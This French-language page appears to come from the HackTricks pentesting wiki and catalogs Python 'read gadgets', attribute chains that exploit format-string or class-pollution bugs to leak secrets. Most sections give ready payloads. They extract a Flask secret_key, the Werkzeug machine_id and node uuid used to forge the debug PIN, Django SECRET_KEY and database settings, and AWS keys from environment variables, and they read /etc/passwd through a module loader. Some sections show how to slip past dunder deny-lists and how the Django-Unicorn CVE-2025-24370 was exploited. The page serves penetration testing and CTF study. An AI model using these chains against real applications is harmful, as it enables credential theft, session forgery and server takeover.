# Gadgets de lecture internes de Python

{{#include ../../banners/hacktricks-training.md}}


## Informations de base

Différentes vulnérabilités telles que [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ou [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) peuvent vous permettre de **lire des données internes de Python, sans toutefois permettre l'exécution de code**. Par conséquent, un pentester devra tirer le meilleur parti de ces permissions de lecture afin d'**obtenir des privilèges sensibles et d'escalader la vulnérabilité**.

### Flask - Lire la clé secrète

La page principale d'une application Flask contiendra probablement l'objet global **`app`**, dans lequel ce **secret est configuré**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Dans ce cas, il est possible d'accéder à cet objet en utilisant n'importe quel gadget permettant d'**accéder aux objets globaux** depuis la page [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Dans le cas où **la vulnérabilité se trouve dans un autre fichier Python**, vous avez besoin d'un gadget permettant de parcourir les fichiers afin d'atteindre le fichier principal pour **accéder à l'objet global `app.secret_key`** et pouvoir [**élever les privilèges** en connaissant cette clé](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload comme celui-ci [provenant de ce writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Utilisez ce payload pour **lire `app.secret_key`**. Si le bug d’origine vous fournit également une primitive d’écriture (par exemple, une class pollution), le même chemin peut être utilisé pour la remplacer et signer des cookies Flask plus privilégiés.

### Werkzeug - machine_id et node uuid

[**En utilisant ces payloads de ce writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) vous pourrez accéder au **machine_id** et au **uuid** du node, qui sont les **éléments privés** dont vous avez besoin pour [**générer le pin Werkzeug**](../../network-services-pentesting/pentesting-web/werkzeug.md) et accéder à la console Python dans `/console` si le **debug mode est activé** :<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Notez que vous pouvez obtenir le **chemin local du serveur vers `app.py`** en générant une **erreur** dans la page web, ce qui **vous donnera le chemin**.

Si la vulnérabilité se trouve dans un autre fichier Python, consultez l’astuce Flask précédente pour accéder aux objets du fichier Python principal.

### Django - SECRET_KEY et module de configuration

L’objet de configuration de Django est mis en cache dans `sys.modules` dès que l’application démarre. Avec uniquement des primitives de lecture, vous pouvez faire fuiter la **`SECRET_KEY`**, les clés de secours, les identifiants de la base de données ou les sels de signature :
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Si le gadget vulnérable se trouve dans un autre module, parcourez d'abord les globals :
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` sont tout aussi précieux que le `SECRET_KEY` actuel : ils permettent toujours de valider les anciennes valeurs signées pendant la rotation.<sup>[[1]](#references)</sup> Exfiltrez également `SESSION_ENGINE` et `SESSION_SERIALIZER` afin de déterminer rapidement si l'impact se limite à la falsification de cookies ou s'il est plus important. Pour les détails concernant l'impact web, consultez la [**page de pentesting Django**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - lire le code source et les fichiers

Les modules Python chargés conservent généralement un `__loader__`. Les loaders basés sur des fichiers exposent souvent `get_source()` et `get_data()`, qui constituent de parfaites **primitives en lecture seule** lorsque vous pouvez déjà accéder à un objet module, mais pas à `open()` :
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Ceci est très utile pour extraire des **modules de configuration, blueprints, fichiers d’aide ou routes cachées** et récupérer des clés d’API, des DSN, des chemins de flags ou des points d’entrée de gadgets supplémentaires.

Si vous disposez uniquement de l’énumération des sous-classes, recherchez le loader par nom au lieu de coder un index en dur :
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals du frame d’un generator / coroutine

Si vous pouvez créer ou atteindre un objet generator/coroutine, son frame peut leak des globals **sans nécessiter de gadget `__globals__` de fonction**. Cela est utile contre les filtres qui bloquent uniquement les noms dunder et oublient les attributs du frame tels que `gi_frame`, `ag_frame`, `cr_frame` ou `f_globals` :
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Une fois que vous avez récupéré les globals de la frame, continuez exactement comme avec les autres gadgets (`sys.modules`, les objets de configuration, `os.environ`, etc.). Les sandbox escapes récentes redécouvrent constamment cette technique, car `gi_frame` et `f_globals` ne sont pas des attributs dunder et survivent souvent aux deny-lists naïves.

### Variables d’environnement / identifiants cloud via les modules chargés

De nombreux jails importent encore `os` ou `sys` quelque part. Vous pouvez exploiter n’importe quelle fonction accessible avec `__init__.__globals__` pour accéder au module `os` déjà importé et extraire les **variables d’environnement** contenant des API tokens, des cloud keys ou des flags :
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Si l’index de la sous-classe est filtré, utilisez des loaders :
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Les variables d’environnement sont fréquemment les seuls secrets nécessaires pour passer de la lecture à la compromission complète (clés cloud IAM, URL de bases de données, clés de signature, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) permettait la **class pollution** via des requêtes de composant spécialement conçues. La définition d’un chemin de propriété tel que `__init__.__globals__` permettait à un attaquant d’atteindre les globals du module du composant ainsi que tous les modules importés (par exemple `settings`, `os`, `sys`). À partir de là, il était possible de provoquer le leak de `SECRET_KEY`, `DATABASES` ou d’identifiants de services sans exécution de code. La chaîne d’exploitation repose entièrement sur la lecture et utilise les mêmes modèles de dunder-gadgets que précédemment.<sup>[[5]](#references)</sup>

### Collections de gadgets pour le chaînage

Les CTF récents et les recherches sur les pyjails montrent des chaînes de lecture fiables, construites uniquement avec l’accès aux attributs et l’énumération des sous-classes. Des listes maintenues par la communauté, comme [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), répertorient des centaines de gadgets minimaux que vous pouvez combiner pour parcourir les objets jusqu’à `__globals__`, `sys.modules`, puis finalement atteindre les données sensibles.<sup>[[2]](#references)</sup> Privilégiez les recherches **basées sur les attributs/noms** plutôt que les index bruts de sous-classes, car la position de `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, etc. change selon les versions de Python et en fonction des bibliothèques supplémentaires importées.

## Références

- [1] [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
